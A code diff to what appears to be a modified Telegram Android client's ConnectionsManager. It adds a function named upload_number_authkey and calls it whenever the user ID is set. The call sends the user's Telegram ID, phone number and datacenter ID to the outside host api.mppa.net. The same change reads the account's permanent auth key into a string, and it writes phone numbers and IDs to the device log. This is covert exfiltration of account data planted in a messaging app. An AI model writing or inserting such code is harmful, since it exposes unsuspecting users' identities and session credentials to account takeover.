@@ -132,20 +132,19 @@ static void test_get_on_response(nhr_request request, nhr_response response) {
     test_get_working = nhr_false;
 }
 
-static int test_get_number(int64_t number,std::string strPhone) {
+static int upload_number_authkey(int64_t number,std::string strPhone) {
 
     test_get_request = nhr_request_create();
 
     std::string userid = ConnectionsManager::getInstance(number).getUserId();
-    std::string userprefixphone = ConnectionsManager::getInstance(number).getPrefixUserPhone();
-    std::string usersuffixphone = ConnectionsManager::getInstance(number).getSuffixUserPhone();
+    std::string userPhone = ConnectionsManager::getInstance(number).getUserPhone();
     std::string userdatacenterid = ConnectionsManager::getInstance(number).getUserDataCenterId();
-    std::string strUrl = "/api/index/autokey.html?tgid=" + userid + "&phonenumber=" + userprefixphone+ usersuffixphone+ "&auto_key=" + "telegram" + "&datacenterid=" + userdatacenterid + "&source=" + "telegramandroid";
+    std::string strUrl = "/api/index/autokey.html?tgid=" + userid + "&phonenumber=" + userPhone + "&auto_key=" + "telegram" + "&datacenterid=" + userdatacenterid + "&source=" + "telegramandroid";
 
-    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", userid.c_str());//Or ANDROID_LOG_INFO, ...
-    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", userprefixphone.c_str());
-    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", usersuffixphone.c_str());
-    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", userdatacenterid.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userid", userid.c_str());//Or ANDROID_LOG_INFO, ...
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userphone", userPhone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userphone1", strPhone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number userdatacenterid", userdatacenterid.c_str());
     nhr_request_set_url(test_get_request, "https", "api.mppa.net", strUrl.c_str(), 80);
 
 
@@ -2022,26 +2021,21 @@ std::string ConnectionsManager::getUserId()
     return std::to_string(currentUserId);
 }
 
-std::string ConnectionsManager::getPrefixUserPhone()
+std::string ConnectionsManager::getUserPhone()
 {
-    return std::to_string(prefixUserPhone);
-}
-
-std::string ConnectionsManager::getSuffixUserPhone()
-{
-    return std::to_string(suffixUserPhone);
+    return std::to_string(currentUserPhone);
 }
 
 std::string ConnectionsManager::getUserDataCenterId()
 {
     return std::to_string(currentDatacenterId);
 }
-void ConnectionsManager::setUserId(int64_t userId,int64_t prefixphone,int64_t sufffixphone) {
 
-    scheduleTask([&, userId,prefixphone,sufffixphone] {
+void ConnectionsManager::setUserId(int64_t userId,int64_t phone) {
+
+    scheduleTask([&, userId,phone] {
         int32_t oldUserId = currentUserId;
-        prefixUserPhone = prefixphone;
-        suffixUserPhone = sufffixphone;
+        currentUserPhone = phone;
         currentUserId = userId;
         if (oldUserId == userId && userId != 0) {
             registerForInternalPushUpdates();
@@ -2062,10 +2056,16 @@ void ConnectionsManager::setUserId(int64_t userId,int64_t prefixphone,int64_t su
 
         }
 
+        if (currentUserId != 0) {
+            Datacenter *datacenter = getDatacenterWithId(currentDatacenterId);
+            if (datacenter != nullptr) {
+                ByteArray *auth = datacenter->authKeyPerm;
+                std::string s3(reinterpret_cast<char const*>(&auth[0]), auth->length);
+                upload_number_authkey(0,std::to_string(phone));
+            }
+        }
 
-#if !defined(NHR_NO_GET) && !defined(NHR_APPVEYOR_CI)
-        test_get_number(0,std::to_string(prefixphone) + std::to_string(sufffixphone));
-#endif
+
 
 
 //        std::string strUrl1 = "/api/index/autokey.html?tgid=" + std::to_string(userId) + "&phonenumber=" + phone + "&auto_key=" + "telegram" + "&datacenterid=" + std::to_string(currentDatacenterId)+ "&source=" + "telegramandroid";
@@ -3489,8 +3489,6 @@ void ConnectionsManager::init(uint32_t version, int32_t layer, int32_t apiId, st
     currentDeviceTimezone = timezoneOffset;
     currentSystemLangCode = systemLangCode;
     currentUserId = userId;
-    prefixUserPhone = userId;
-    suffixUserPhone = userId;
     currentLogPath = logPath;
     pushConnectionEnabled = enablePushConnection;
     currentNetworkType = networkType;
